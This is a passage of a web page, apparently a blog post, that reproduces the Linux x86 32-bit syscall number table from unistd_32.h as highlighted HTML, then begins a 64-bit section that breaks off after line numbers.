96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpriority 97</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_profil 98</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs 99</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioperm 101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketcall 102</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer 104</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer 105</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 106</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 107</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 108</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_olduname 109</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_iopl 110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vhangup 111</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_idle 112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vm86old 113</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4 114</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapoff 115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysinfo 116</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ipc 117</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsync 118</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigreturn 119</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone 120</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setdomainname 121</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uname 122</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_modify_ldt 123</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_adjtimex 124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 125</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigprocmask 126</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_create_module 127</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_init_module 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_delete_module 129</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_quotactl 131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgid 132</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchdir 133</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bdflush 134</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysfs 135</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_personality 136</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_afs_syscall 137</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid 138</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid 139</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__llseek 140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents 141</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__newselect 142</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flock 143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync 144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv 145</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev 146</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsid 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fdatasync 148</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__sysctl 149</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock 150</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlock 151</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlockall 152</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlockall 153</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setparam 154</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getparam 155</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setscheduler 156</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield 158</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep 162</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap 163</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid 164</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vm86 166</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_query_module 167</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 168</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nfsservctl 169</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid 170</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid 171</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prctl 172</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction 174</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigpending 176</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64 180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64 181</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown 182</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcwd 183</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capget 184</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capset 185</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaltstack 186</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile 187</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpmsg 188</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_putpmsg 189</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork 190</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ugetrlimit 191</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap2 192</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate64 193</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate64 194</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat64 195</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat64 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat64 197</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown32 198</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid32 199</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid32 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid32 201</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid32 202</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid32 203</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid32 204</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups32 205</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups32 206</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown32 207</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid32 208</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid32 209</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid32 210</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid32 211</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown32 212</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid32 213</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid32 214</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid32 215</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid32 216</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pivot_root 217</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore 218</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise 219</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents64 220</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl64 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettid 224</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readahead 225</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setxattr 226</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lsetxattr 227</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsetxattr 228</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getxattr 229</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lgetxattr 230</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fgetxattr 231</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listxattr 232</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_llistxattr 233</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flistxattr 234</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_removexattr 235</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lremovexattr 236</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fremovexattr 237</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tkill 238</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile64 239</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futex 240</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_thread_area 243</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_thread_area 244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_setup 245</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_destroy 246</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_getevents 247</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_submit 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_cancel 249</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64 250</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit_group 252</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create 254</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl 255</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_remap_file_pages 257</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_tid_address 258</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_create 259</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_settime 260</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_gettime 261</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_delete 263</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_settime 264</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_gettime 265</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_getres 266</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs64 268</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs64 269</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tgkill 270</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimes 271</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64_64 272</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vserver 273</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mbind 274</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_mempolicy 275</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_mempolicy 276</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_open 277</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_unlink 278</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedsend 279</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_notify 281</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kexec_load 283</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitid 284</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_add_key 286</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_request_key 287</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_keyctl 288</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_set 289</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_get 290</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init 291</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_migrate_pages 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_openat 295</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdirat 296</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknodat 297</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchownat 298</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futimesat 299</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatat64 300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlinkat 301</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat 302</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_linkat 303</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlinkat 304</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlinkat 305</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmodat 306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_faccessat 307</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pselect6 308</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ppoll 309</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unshare 310</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_robust_list 311</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_robust_list 312</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_splice 313</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync_file_range 314</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tee 315</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vmsplice 316</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_pages 317</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcpu 318</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_pwait 319</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimensat 320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd_create 322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd 323</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fallocate 324</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd_settime 325</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd4 327</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd2 328</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create1 329</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup3 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe2 331</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init1 332</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_preadv 333</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwritev 334</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_perf_event_open 336</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmmsg 337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fanotify_init 338</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fanotify_mark 339</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prlimit64 340</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_adjtime 343</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syncfs 344</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmmsg 345</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setns 346</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_process_vm_readv 347</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_process_vm_writev 348</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kcmp 349</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_finit_module 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setattr 351</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getattr 352</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat2 353</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_seccomp 354</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrandom 355</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_memfd_create 356</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 357</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execveat 358</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket 359</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair 360</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind 361</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect 362</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen 363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept4 364</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt 365</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt 366</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname 367</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername 368</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto 369</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg 370</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom 371</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg 372</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown 373</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_userfaultfd 374</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_membarrier 375</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock2 376</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_copy_file_range 377</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_preadv2 378</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwritev2 379</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pkey_mprotect 380</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pkey_alloc 381</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pkey_free 382</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statx 383</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_arch_prctl 384</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span 